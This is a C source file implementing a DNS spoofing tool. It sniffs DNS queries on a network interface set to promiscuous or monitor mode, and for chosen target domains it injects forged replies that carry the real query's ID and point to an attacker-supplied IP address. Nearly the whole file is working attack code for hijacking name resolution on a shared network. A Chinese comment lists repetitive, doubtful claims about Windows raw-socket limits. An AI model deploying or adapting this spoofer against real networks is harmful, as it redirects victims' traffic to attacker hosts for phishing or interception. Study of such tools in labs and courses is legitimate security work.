/*
 * pcap_example.c
 *
 *  Created on: Apr 28, 2016
 *      Author: jiaziyi
 */

#include<stdio.h>
#include<string.h>
#include<stdlib.h>

#include<pcap.h>
#include "header.h"

#include "spoof.h"
#include "header.h"
#include "dns.h"
#include "config.h"

#ifdef __linux__
#include<sys/socket.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include <errno.h>
#else
#include <winsock2.h>
#include <Windows.h>

#pragma comment(lib, "lib/wpcap.lib")
#pragma comment(lib, "ws2_32.lib")
#endif


//windows 对raw socket的限制
/*
1. 不允许非管理员用户创建原始套接字。
2. 不允许使用原始套接字发送 TCP 数据包。只能使用原始套接字发送 ICMP、UDP 和自定义协议的数据包。
3. 不允许使用原始套接字发送广播数据包。
4. 不允许使用原始套接字发送数据包到本地回环接口
5. 不允许使用原始套接字发送数据包到本地接口的 IP 地址
6. 不允许使用原始套接字发送数据包到本地接口的 MAC 地址
7. 不允许使用原始套接字发送数据包到本地接口的广播 MAC 地址
8. 不允许使用原始套接字发送数据包到本地接口的组播 MAC 地址
9. 不允许使用原始套接字发送数据包到本地接口的多播 MAC 地址
10. 不允许使用原始套接字发送数据包到本地接口的任意 MAC 地址
11. 不允许使用原始套接字发送数据包到本地接口的任意 IP 地址
12. 不允许使用原始套接字发送数据包到本地接口的任意端口
13. 不允许使用原始套接字发送数据包到本地接口的任意协议
*/

int g_header_type;


int g_tcp=0, g_udp=0, g_icmp=0, g_others=0, g_igmp=0, g_total=0;

int g_fd = 0;

int g_fd6 = 0;





void initSocket() {
	if (g_fd == 0)
	{
		g_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
		int hincl = 1;                  /* 1 = on, 0 = off */
		setsockopt(g_fd, IPPROTO_IP, IP_HDRINCL, (char*) & hincl, sizeof(hincl));
		if (g_fd < 0)
		{
			perror("Error creating raw socket ");
			exit(1);
		}

		g_fd6 = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);

		setsockopt(g_fd6, IPPROTO_IPV6, IPV6_HDRINCL, (char*)&hincl, sizeof(hincl));
		if (g_fd6 < 0)
		{
			perror("Error creating raw socket ");
			exit(1);
		}
	}
}

char* g_target_dns = 0;
int g_target_dns_count = 0;
unsigned int g_target_ip = 0;

pcap_t* g_send_handle = 0;

int spoof(char * card,char * target,char * ip,char * dns,int count)
{
	int ret = 0;
	g_target_dns = dns;
	g_target_dns_count = count;
	inet_pton(AF_INET, ip, &g_target_ip);

	initSocket();

	pcap_t *handle;
	pcap_if_t *all_dev, *dev;

	char err_buf[PCAP_ERRBUF_SIZE];
	char* dev_list = malloc(256 * 256);
	if (dev_list == 0)
		return -1;

	bpf_u_int32 net_ip, mask;

	if(pcap_findalldevs(&all_dev, err_buf))
	{
		fprintf(stderr, "Unable to find devices: %s", err_buf);
		exit(1);
	}

	if(all_dev == NULL)
	{
		fprintf(stderr, "No device found. Please check that you are running with root \n");
		exit(1);
	}

	printf("Available devices list: \n");
	int c = 1;

	for(dev = all_dev; dev != NULL; dev = dev->next)
	{
		printf("#%d %s : %s \n", c, dev->name, dev->description);
		if(dev->name != NULL)
		{
			strncpy(dev_list + (c-1)*256, dev->name, strlen(dev->name));
		}
		c++;
	}

	printf("Please choose the monitoring device (e.g., en0):\n");

	char dev_name[256];
	if (card) {
		int isnum = isNumber(card);
		if (isnum) {
			int seq = atoi(card);
			strcpy(dev_name, dev_list + (seq - 1) * 256);
		}
		else {
#ifdef _WIN32
#ifdef _DEBUG
			char* devname = "\\Device\\NPF_{AFE10454-955A-4B34-9B6B-6DAEA54B34BB}";
			strcpy(dev_name, devname);
#else
			strcpy(dev_name, card);
#endif
#else
			strcpy(dev_name, card);
#endif
		}		
	}
	else {
		fgets(dev_name, sizeof(dev_name), stdin);
		*(dev_name + strlen(dev_name) - 1) = '\0'; //the pcap_open_live don't take the last \n in the end
	}

	printf("dev name: %s\r\n", dev_name);

	ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
	if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		//exit(1);
	}

	struct sockaddr_in addr;
	addr.sin_addr.s_addr = net_ip;
	char ip_char[64];
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, sizeof(ip_char));
	printf("NET card interface:%s address: %s\n", dev_name,ip_char);

	addr.sin_addr.s_addr = mask;
	memset(ip_char, 0, sizeof(ip_char));
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, sizeof(ip_char));
	printf("Mask: %s\n", ip_char);

	if (!(handle = pcap_create(dev_name, err_buf))){
		fprintf(stderr, "Pcap create error : %s", err_buf);
		exit(1);
	}

	//If the device can be set in monitor mode (WiFi), we set it.Otherwise, promiscuous mode is set
#ifdef __linux__
	if (pcap_can_set_rfmon(handle)==1){
		if (pcap_set_rfmon(handle, 1))
			pcap_perror(handle,"Error while setting monitor mode\r\n");
		else
			pcap_perror(handle,"setting monitor mode\r\n");
	}
#endif
	if(pcap_set_promisc(handle,1))
		pcap_perror(handle,"Error while setting promiscuous mode\r\n");
	else
		pcap_perror(handle,"setting promisc mode ok\r\n");

	ret = pcap_set_buffer_size(handle, 4 * 1024 * 1024);
	if (ret) {
		printf("pcap_set_buffer_size error:%s\r\n", pcap_geterr(handle));
	}

	ret = pcap_set_immediate_mode(handle, 1);
	if (ret) {
		printf("pcap_set_immediate_mode error:%s\r\n", pcap_geterr(handle));
	}
	
	ret = pcap_set_snaplen(handle, 0x10000);
	if (ret) {
		printf("pcap_set_snaplen error:%s\r\n", pcap_geterr(handle));
	}

	ret = pcap_setnonblock(handle, 1, err_buf);
	if (ret) {
		printf("pcap_setnonblock error:%s\r\n", pcap_geterr(handle));
	}

	//ret = pcap_setmintocopy(handle, 32);
	//if (ret) {
	//	printf("pcap_setmintocopy error:%s\r\n", err_buf);
	//}
	//Setting timeout for processing packets to 1 ms
	if (pcap_set_timeout(handle, 0))
		pcap_perror(handle,"Pcap set timeout error");

	//Activating the sniffing handle
	if (pcap_activate(handle))
		pcap_perror(handle,"Pcap activate error");

	// the the link layer header type
	// see http://www.tcpdump.org/linktypes.html
	g_header_type = pcap_datalink(handle);

	//	char filter_exp[] = "host 192.168.1.100";	/* The filter expression */
	char filter_exp[] = "udp && (dst port 53)";
	//	char filter_exp[] = "udp && port 53";
	struct bpf_program fp;		/* The compiled filter expression */

	if (pcap_compile(handle, &fp, filter_exp, 0, mask) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}

	if(handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
		exit(1);
	}

	printf("Device %s is opened. Begin sniffing with filter %s...\n", dev_name, filter_exp);

	logfile=fopen("log.txt","w");
	if(logfile==NULL)
	{
		printf("Unable to create file.");
	}

	g_send_handle = pcap_open_live(target, 0x10000, 1, 0, err_buf);
	if(g_send_handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", target, err_buf);
		exit(1);
	}
	printf("Device %s is opened. Begin sniffing with filter %s...\n", target, filter_exp);
		
	pcap_loop(handle , -1 , process_packet , handle);

	pcap_freealldevs(all_dev);

	pcap_close(handle);

	return 0;
}


int g_eth_tag = 0;

unsigned char g_bssid_mac[6] = { 0x90,0x4c,0x81,0x66,0x22,0x70 }; 



void process_packet(pcap_t* handle, const struct pcap_pkthdr *header, const u_char * packet)
{

	int ret = 0;
	
	int ethl = 0;
	int iphrl = 0;

	int packl = header->len;

	//printf("a packet is received! %d \n", g_total++);
	//printdata(packet, packl);

	struct ethhdr* in_ethhdr = 0;
	struct iphdr *in_iphr = 0;
	struct iphdr6* in_iphr6 = 0;

	switch (g_header_type)
	{
	case LINKTYPE_ETH:
		if (g_eth_tag) {
			in_ethhdr = 0;
			ethl = 0;
			
			in_iphr = (struct iphdr*)(packet + sizeof(struct ethhdr));
			packl -= sizeof(struct ethhdr);
			packet += sizeof(struct ethhdr);
		}
		else {
			in_ethhdr = packet;
			ethl = sizeof(struct ethhdr);
			in_iphr = (struct iphdr*)(packet + sizeof(struct ethhdr));
		}

		break;

	case LINKTYPE_NULL:
		in_iphr = (struct iphdr*)(packet + 4);
		//packl -= 4;
		break;

	case LINKTYPE_IP:
		in_ethhdr = 0;
		ethl = 0;
		in_iphr = (struct iphdr*)(packet);
		break;

	case LINKTYPE_WIFI:
		in_iphr = (struct iphdr*)(packet + 57);
		//packl -= 57;
		break;

	default:
		fprintf(stderr, "Unknown header type %d\n", g_header_type);
		exit(1);
	}

	struct udphdr* in_udphdr;
	in_iphr6 = (struct iphdr6*)in_iphr;
	int ipv = in_iphr->version;
	if (ipv == 4)
	{	
		in_udphdr = (struct udphdr*)((char*)in_iphr + sizeof(struct iphdr));
		iphrl = in_iphr->ihl * 4;
	}
	else {
		in_udphdr = (struct udphdr*)(in_iphr6 + 1);
		iphrl = sizeof(struct iphdr6);
	}
		
	//print_udp_packet((u_char*)in_iphr, size);

	uint8_t *in_dns = (uint8_t*)(in_udphdr + 1);
	struct DnsHeader* in_dnshdr = (struct DnsHeader*)in_dns;
	//int id = parse_dns_query(dns_buff, queries, answers, auth, addit);

	uint8_t send_buf[BUF_SIZE];

	int dnsOffset = in_dns - (uint8_t *) packet;
	int dnsLen = packl - dnsOffset;
	dns_header *out_dnshdr = (dns_header*)(send_buf + dnsOffset);
	memcpy((char*)out_dnshdr, in_dns, dnsLen);

	int dnsid = in_dnshdr->id;
	struct DnsHeader* out_DnsHdr = (struct DnsHeader*)out_dnshdr;
	out_DnsHdr->id = dnsid;
#if __BYTE_ORDER == __LITTLE_ENDIAN
	out_DnsHdr->flags = 0x8081;
	out_DnsHdr->qd_count = 0x0100;
	out_DnsHdr->an_count = 0x0100;
#else
	out_DnsHdr->flags = 0x8180;
	out_DnsHdr->qd_count = 0x01;
	out_DnsHdr->an_count = 0x01;
#endif
	out_DnsHdr->ns_count = 0;
	out_DnsHdr->ar_count = 0;

	uint8_t* ptr = (uint8_t*)out_dnshdr + sizeof(dns_header);
	/*
	
	uint8_t qname[HOST_NAME_SIZE];
	int position = 0;
	get_domain_name(ptr,(char*) out_dnshdr, qname, &position);
	ptr += position ;
	ptr += sizeof(question);
	printf("qname: %s\n", qname);
	*/
	ret = isTargetDns(ptr,g_target_dns,g_target_dns_count);
	if (ret == 0) {
		return 0;
	}
	ptr = (uint8_t*)out_dnshdr + dnsLen;
	int pos = 0;
#if __BYTE_ORDER == __LITTLE_ENDIAN
	*(unsigned short*)(ptr + pos) = 0x0cc0;  //set the pointer to the name field in the query section
#else
	* (unsigned short*)(ptr + pos) = 0xc00c;
#endif
	pos += 2;
	//build_name_section((uint8_t*)p,queries[i].qname,&pos);
	ptr += pos;
	r_element* fixPart = (r_element*)ptr;
#if __BYTE_ORDER == __LITTLE_ENDIAN
	fixPart->type = 0x0100; 
	fixPart->_class = 0x0100; 
	fixPart ->ttl = 0xff000000;
	fixPart->rdlength = 0x0400;
#else
	fixPart->type = 0x01;
	fixPart->_class = 0x01;
	fixPart->ttl = 0xff;
	fixPart->rdlength = 0x04;
#endif
	ptr += sizeof(r_element);
	memcpy(ptr, &g_target_ip, sizeof(g_target_ip));
	ptr += 4;

	if (ethl) {
		struct ethhdr* out_ethhdr = (struct ethhdr*)send_buf;
		memcpy(out_ethhdr->h_dest, in_ethhdr->h_source, ETH_ALEN);
		memcpy(out_ethhdr->h_source, in_ethhdr->h_dest, ETH_ALEN);
		out_ethhdr->h_proto = in_ethhdr->h_proto;	
		//memcpy(out_ethhdr->h_source, g_bssid_mac,6);
	}

	struct udphdr *out_udphdr = (struct udphdr*)(send_buf + ethl + iphrl);
    size_t payload = ptr - (uint8_t*)out_dnshdr;
	out_udphdr->source = in_udphdr->dest;
	out_udphdr->dest = in_udphdr->source;
	out_udphdr->len = htons(sizeof(struct udphdr) + payload);
	out_udphdr->check = 0;

	struct pseudo_udp_header psh ;
	struct pseudo_udp_header6 psh6;
	char pseudobuf[1024];
	if (ipv == 4) {
		psh.source_address = in_iphr->daddr;
		psh.dest_address = in_iphr->saddr;
		psh.placeholder = 0;
		psh.protocol = 17;
		psh.udp_length = out_udphdr->len;

		int psl = sizeof(struct pseudo_udp_header) + sizeof(struct udphdr) + payload;
		memcpy(pseudobuf, (char*)&psh, sizeof(struct pseudo_udp_header));
		memcpy(pseudobuf + sizeof(struct pseudo_udp_header), out_udphdr, sizeof(struct udphdr) + payload);
		out_udphdr->check = checksum((unsigned short*)pseudobuf, psl);
	}
	else {
		memcpy(psh6.daddr, in_iphr6->dip, 16);
		memcpy(psh6.saddr, in_iphr6->sip, 16);
		memset(psh6.pad, 0, 3);
		psh6.ulpl = ntohl(sizeof(struct udphdr) + payload);
		psh6.protocol = 17;

		int psl = sizeof(struct pseudo_udp_header6) + sizeof(struct udphdr) + payload;
		memcpy(pseudobuf, (char*)&psh6, sizeof(struct pseudo_udp_header6));
		memcpy(pseudobuf + sizeof(struct pseudo_udp_header6), out_udphdr, sizeof(struct udphdr) + payload);
		out_udphdr->check = checksum((unsigned short*)pseudobuf, psl);
	}

	if (ipv == 4) {
		struct iphdr* out_iphdr = (struct iphdr*)(send_buf + ethl);
		out_iphdr->ihl = in_iphr->ihl;
		out_iphdr->version = in_iphr->version;
		out_iphdr->tos = in_iphr->tos;
		out_iphdr->tot_len = htons(payload + sizeof(struct iphdr) + sizeof(struct udphdr));
		out_iphdr->id = in_iphr->id;
		out_iphdr->frag_off = in_iphr->frag_off;
		out_iphdr->ttl = 255;
		out_iphdr->protocol = 17;
		out_iphdr->check = 0;
		
		out_iphdr->daddr = in_iphr->saddr;
		out_iphdr->saddr = in_iphr->daddr;
		out_iphdr->check = checksum((unsigned short*)out_iphdr, sizeof(struct iphdr));

		if (ethl == 0 ) {
			struct sockaddr_in sa;
			sa.sin_family = AF_INET;
#ifdef __linux
			sa.sin_addr.s_addr = out_iphdr->daddr;
#else
			sa.sin_addr.S_un.S_addr = out_iphdr->daddr;
#endif
			sa.sin_port = out_udphdr->dest;
			ret=sendto(g_fd, send_buf, payload + sizeof(struct iphdr) + sizeof(struct udphdr), 0, (struct sockaddr*)&sa, sizeof(sa));
			//ret = pcap_sendpacket(handle, send_buf,payload + sizeof(struct iphdr) + sizeof(struct udphdr) + ethl);
		}
		else {
			ret = pcap_sendpacket(handle, send_buf,
				payload + sizeof(struct iphdr) + sizeof(struct udphdr) + ethl);
		}

		if (ret <= 0) {
			printf("send packet errno:%d\r\n", errno);
		}
		uint8_t* dn = (uint8_t*)out_dnshdr + sizeof(dns_header);
		printf("domain name:%s\r\n",dn);

		//printf("send packet:\r\n");
		//printdata(send_buf, payload + sizeof(struct iphdr) + sizeof(struct udphdr) + ethl);
		//printf("recv packet:\r\n");
		//printdata(packet, packl);
	}
	else {
		struct iphdr6* out_iphdr6 = (struct iphdr6*)(send_buf + ethl);
		memcpy(out_iphdr6->dip, in_iphr6->sip, 16);
		memcpy(out_iphdr6->sip, in_iphr6->dip, 16);
		//out_iphdr6->version = 6;
		//out_iphdr6->label = in_iphr6->label;
		//out_iphdr6->class = in_iphr6->class;
		out_iphdr6->vlc = in_iphr6->vlc;
		out_iphdr6->ttl = 255;
		out_iphdr6->next = 17;
		out_iphdr6->pll = ntohs(payload + sizeof(struct udphdr));

		if (ethl == 0 ) {
			struct sockaddr_in6 sa;
			sa.sin6_family = AF_INET6;
#ifdef __linux
			sa.sin6_addr = *(struct in6_addr*)out_iphdr6->dip;
#else
			sa.sin6_addr = *(struct in6_addr*)out_iphdr6->dip;
#endif
			sa.sin6_port = out_udphdr->dest;
			ret = sendto(g_fd6, send_buf, payload + sizeof(struct iphdr) + sizeof(struct udphdr), 0, (struct sockaddr*)&sa, sizeof(sa));
		}
		else {
			ret = pcap_sendpacket(handle, send_buf,
				payload + sizeof(struct iphdr6) + sizeof(struct udphdr) + ethl);

		}
		if (ret < 0) {
			printf("send packet errno:%d\r\n", errno);
		}

		uint8_t* dn = (uint8_t*)out_dnshdr + sizeof(dns_header);
		printf("domain name:%s\r\n", dn);

		//printf("send packet:\r\n");
		//printdata(send_buf, payload + sizeof(struct iphdr6) + sizeof(struct udphdr) + ethl);
		//printf("recv packet:\r\n");
		//printdata(packet, packl);
	}
}
